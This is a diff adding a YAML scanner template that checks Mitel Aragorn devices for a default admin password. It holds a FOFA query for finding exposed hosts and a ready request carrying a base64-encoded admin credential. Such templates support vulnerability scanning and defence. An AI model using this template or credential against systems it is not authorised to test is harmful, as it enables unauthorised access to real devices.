@@ -1,0 +1,30 @@
+id: mitel-aragorn-login-weak-password
+
+info:
+  name: "Mitel Aragorn登录接口存在弱口令认证绕过风险"
+  author: NdayPoc
+  severity: high
+  description: |-
+    fofa: header="Server" && header="Aragorn"
+    Mitel 系统的 Aragorn 登录接口存在弱口令缺陷，攻击者可利用该漏洞绕过身份认证直接访问后台管理界面，进而窃取敏感数据或完全控制服务器。
+  reference:
+  - https://mp.weixin.qq.com/s/q6qYbC5o5IbFyroOOQYAGw
+  tags: Mitel
+
+http:
+- raw:
+  - |
+    GET /sysinfo.html HTTP/1.1
+    Host: {{Hostname}}
+    Authorization: Basic YWRtaW46MjIyMjI=
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'System Information'
+    - 'User Password'
+    condition: and
+  - type: status
+    status:
+    - 200
